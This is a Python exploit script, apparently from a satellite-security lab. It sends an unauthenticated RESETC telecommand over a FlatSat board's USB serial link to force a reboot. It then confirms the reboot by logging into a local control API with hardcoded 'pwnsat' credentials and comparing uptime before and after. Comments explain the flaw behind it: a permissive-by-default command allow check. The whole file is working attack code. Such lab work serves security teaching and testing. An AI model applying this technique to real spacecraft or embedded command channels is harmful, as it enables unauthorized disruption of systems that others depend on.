#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 07_resetc_usb.py -- RESETC with no authentication, delivered over
# FlatSat's real USB CDC serial link instead of RF. "Round 1" (USB) -- see
# 07_resetc_rf.py in this same folder for the original RF version, which
# has the full root-cause writeup (groundStationCommandAllowed() permissive
# by default, RESETC's own handler just blinks an LED and calls
# softwareReset()).
#
# RESETC sends NO TM of its own before rebooting -- there's nothing to read
# back, over USB or RF. Worse for THIS script specifically: the packet is
# delivered over the exact same USB connection that immediately drops when
# the board reboots (unlike the RF version, whose HackRF TX is a completely
# separate physical channel from the FlatSat's own USB port). So this
# script's own connection can't be reused for confirmation even in
# principle -- same as the RF version, the only reliable confirmation is
# polling PWNSAT-C3's REST API (which has its OWN, separate connection to
# the board and reconnects on its own -- see app.py's _connect_with_retry
# watchdog) for uptime_s before/after.
#
# NOT YET VALIDATED ON REAL HARDWARE -- see lib/flatsat_usb.py's header.

import argparse
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from flatsat_usb import FlatSatUSB  # noqa: E402

# NOTE: the RF version of this script (07_resetc_rf.py) hardcodes
# C3_BASE_URL = "http://127.0.0.1:8000" -- stale relative to this whole
# project's actual, currently-used PWNSAT-C3 port (8791, confirmed
# throughout this session's dual-platform work). Using the real port here.
C3_BASE_URL = "http://127.0.0.1:8791"
C3_LOGIN = {"username": "pwnsat", "password": "pwnsat"}


def read_uptime_via_c3(timeout_s: float = 4.0):
    """Best-effort: logs into PWNSAT-C3's REST API, sends a 'status'
    command over ITS OWN (separate) connection to the FlatSat, and pulls
    uptime_s back out of the STATUS TM over the websocket. Returns None on
    any failure -- this is a convenience, never required for the attack
    itself. Same approach as 07_resetc_rf.py's own helper, copied here
    rather than imported (keeps this script standalone)."""
    try:
        import asyncio
        import json
        import requests
        import websockets
    except ImportError:
        return None

    async def _poll():
        s = requests.Session()
        r = s.post(f"{C3_BASE_URL}/api/login", json=C3_LOGIN, timeout=3)
        if r.status_code != 200:
            return None
        s.post(f"{C3_BASE_URL}/api/command", json={"command": "status"}, timeout=3)
        cookie_header = "; ".join(f"{k}={v}" for k, v in s.cookies.get_dict().items())
        try:
            async with websockets.connect(f"{C3_BASE_URL.replace('http', 'ws')}/ws",
                                          additional_headers={"Cookie": cookie_header}) as ws:
                deadline = time.time() + timeout_s
                while time.time() < deadline:
                    try:
                        msg = await asyncio.wait_for(ws.recv(), timeout=deadline - time.time())
                    except asyncio.TimeoutError:
                        break
                    data = json.loads(msg)
                    if data.get("apid_name") == "STATUS":
                        return data.get("fields", {}).get("uptime_s")
        except Exception:
            return None
        return None

    try:
        return asyncio.run(_poll())
    except Exception:
        return None


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--seq", type=int, default=1, help="SPP sequence count")
    parser.add_argument("--encrypt", choices=["on", "off"], default="on")
    parser.add_argument("--port", default=None,
                        help="serial port for the USBRadioLink (default: autodetect) -- "
                             "NOTE: if PWNSAT-C3 is running, it already holds this port; "
                             "release it first (POST /api/transport/serial/release, same "
                             "pattern as PWNCUBE's dossier) or stop C3 entirely.")
    parser.add_argument("--confirm-via-c3", choices=["on", "off"], default="on",
                        help="poll PWNSAT-C3's REST API for uptime_s before/after to "
                             "auto-confirm the reboot (default on; needs C3 running with "
                             "ITS OWN connection to the board, separate from this script's)")
    parser.add_argument("--quiet", action="store_true")
    args = parser.parse_args()

    uptime_before = None
    if args.confirm_via_c3 == "on":
        print("[*] Checking PWNSAT-C3 for the FlatSat's current uptime (pre-attack baseline)...")
        uptime_before = read_uptime_via_c3()
        if uptime_before is None:
            print("    -> couldn't reach PWNSAT-C3 or get a STATUS reply in time -- "
                  "continuing without auto-confirmation (check manually after).")
        else:
            print(f"    -> uptime_s={uptime_before} before the attack.")

    print(f"[*] RESETC ({'encrypted' if args.encrypt == 'on' else 'cleartext'}, "
          f"seq={args.seq}) -- no authentication, no confirmation TM.")

    with FlatSatUSB(port=args.port, encrypt=(args.encrypt == "on"),
                    verbose=not args.quiet) as fsat:
        try:
            fsat.send_tc("reset", seq=args.seq, listen_seconds=0.5)
        except Exception as exc:  # noqa: BLE001 -- the reboot itself can drop the port mid-write
            print(f"[*] Write/read raised {exc!r} -- expected if the board rebooted fast "
                  "enough to drop this connection before the read timeout finished.")

    print("[+] Sent.")

    if uptime_before is None:
        print("\n[?] No automatic confirmation available -- check the FlatSat's serial "
              "console (LED pattern, then USB CDC ports drop and re-enumerate) or "
              "PWNSAT-C3 (uptime resets to 0) by hand.")
        return

    print("[*] Waiting for the FlatSat to reboot and PWNSAT-C3 to reconnect...")
    time.sleep(6.0)
    uptime_after = read_uptime_via_c3(timeout_s=6.0)

    print("\n" + "=" * 66)
    if uptime_after is None:
        print("[i] Packet sent -- PWNSAT-C3 just hasn't reconnected to the FlatSat's new "
              "USB enumeration yet. Give it a few more seconds (its watchdog reconnects "
              "on its own, no restart needed) and read uptime_s fresh to confirm.")
    elif uptime_after < uptime_before:
        print(f"[+] REBOOT CONFIRMED: uptime_s went {uptime_before} -> {uptime_after} "
              f"(dropped instead of continuing to climb) -- the FlatSat rebooted from a "
              f"single unauthenticated RESETC, no credentials of any kind involved.")
    else:
        print(f"[?] uptime_s went {uptime_before} -> {uptime_after} -- did NOT drop as "
              f"expected. Either the reboot hasn't finished yet or the packet didn't land.")
    print("=" * 66)


if __name__ == "__main__":
    main()
